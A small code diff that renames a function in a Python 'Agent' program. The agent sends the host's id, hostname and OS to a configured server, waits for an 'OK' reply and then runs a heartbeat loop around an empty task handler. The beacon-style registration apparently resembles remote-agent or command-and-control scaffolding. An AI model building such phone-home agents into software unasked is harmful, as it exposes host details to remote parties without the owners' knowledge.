@@ -6,6 +6,7 @@ import time
 import socket
 import platform
 
+
 class Agent():
     
     def __init__(self): # loads up settings from .env
@@ -34,7 +35,7 @@ class Agent():
 def handle_task(tsk):
     pass
  
-def send_info(url):
+def connect(url):
     id, name, os =  me.id, socket.gethostname(), platform.system()
     res = requests.post(url+"/info", json={"id" : id, "os" : os, "name" : name}, timeout=5)
     while res.text != "OK":
@@ -43,7 +44,7 @@ def send_info(url):
     
         
 def active_loop(pointurl, agentID, heartbeat):
-    send_info(pointurl)
+    connect(pointurl)
     
     while True:
         try:
